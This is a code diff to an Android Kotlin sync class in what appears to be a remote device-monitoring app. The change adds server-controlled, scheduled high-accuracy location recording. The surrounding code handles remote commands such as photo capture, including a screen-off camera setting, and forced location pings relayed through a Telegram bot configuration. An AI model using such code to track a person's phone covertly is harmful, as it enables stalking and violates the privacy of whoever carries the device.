@@ -41,11 +41,27 @@ object SyncHelper {
             val status: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
             val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
 
-            // 2. High-Accuracy Location
-            val loc = LocationHelper.getBestLocation(context)
-            val lat: Double? = loc?.latitude
-            val lon: Double? = loc?.longitude
-            val accuracy: Float? = loc?.accuracy
+            // 2. High-Accuracy Location (Evaluated against Adaptive Schedule)
+            val tgPref = context.getSharedPreferences("tg_pref", Context.MODE_PRIVATE)
+            val isLocationEnabled = tgPref.getBoolean("sendLocation", true)
+            val isDue = LocationScheduleHelper.isLocationDue(context)
+
+            var lat: Double? = null
+            var lon: Double? = null
+            var accuracy: Float? = null
+
+            if (isLocationEnabled && isDue) {
+                val loc = LocationHelper.getBestLocation(context)
+                lat = loc?.latitude
+                lon = loc?.longitude
+                accuracy = loc?.accuracy
+                if (lat != null && lon != null) {
+                    LocationScheduleHelper.recordLocationSent(context, System.currentTimeMillis())
+                    Log.d(TAG, "Location recorded per schedule: $lat, $lon (accuracy: ${accuracy}m)")
+                }
+            } else {
+                Log.d(TAG, "Location recording skipped (due=${isDue}, interval=${LocationScheduleHelper.getActiveIntervalSeconds(context)}s)")
+            }
 
             // 3. Health & Diagnostic status
             val healthJson = DeviceHealthHelper.getDeviceHealth(context).toJsonObject()
@@ -66,7 +82,7 @@ object SyncHelper {
                 health = healthJson,
                 executedCommandIds = executedIds,
                 isLocked = wasLocked,
-                appVersion = "1.0.0"
+                appVersion = "1.1"
             )
 
             if (!result.success) {
@@ -94,7 +110,6 @@ object SyncHelper {
 
             // 7. Apply Remote Configuration to App Preferences (tg_pref)
             val cfg = result.config
-            val tgPref = context.getSharedPreferences("tg_pref", Context.MODE_PRIVATE)
             val editor = tgPref.edit()
 
             if (cfg.telegramBotToken.isNotEmpty()) {
@@ -116,6 +131,12 @@ object SyncHelper {
             editor.putBoolean("cameraScreenOff", cfg.cameraScreenOff)
             editor.putString("cameraFacing", cfg.cameraFacing)
             editor.apply()
+
+            LocationScheduleHelper.saveConfig(
+                context,
+                cfg.locationSchedulesJson,
+                cfg.locationDefaultIntervalSeconds
+            )
 
             // Update Sync Interval in preferences & scheduler if changed
             val currentIntervalSec = DevicePreferences.getSyncIntervalSeconds(context)
@@ -150,11 +171,17 @@ object SyncHelper {
                         if (!facing.isNullOrEmpty()) {
                             tgPref.edit().putString("cameraFacing", facing).apply()
                         }
+                        val schedulesArr = cmd.params?.optJSONArray("locationSchedules")
+                        val defInterval = cmd.params?.optLong("locationDefaultIntervalSeconds", 60L) ?: 60L
+                        if (schedulesArr != null) {
+                            LocationScheduleHelper.saveConfig(context, schedulesArr.toString(), defInterval)
+                        }
                     }
                     "PING_DEVICE", "SYNC_NOW" -> {
                         Log.d(TAG, "Device ping received and acknowledged: ${cmd.id}")
                     }
                     "PING_LOCATION" -> {
+                        LocationScheduleHelper.forceNextLocation(context)
                         context.sendBroadcast(Intent("com.example.telegramsender.ACTION_FORCE_LOCATION"))
                     }
                     "CAPTURE_PHOTO" -> {
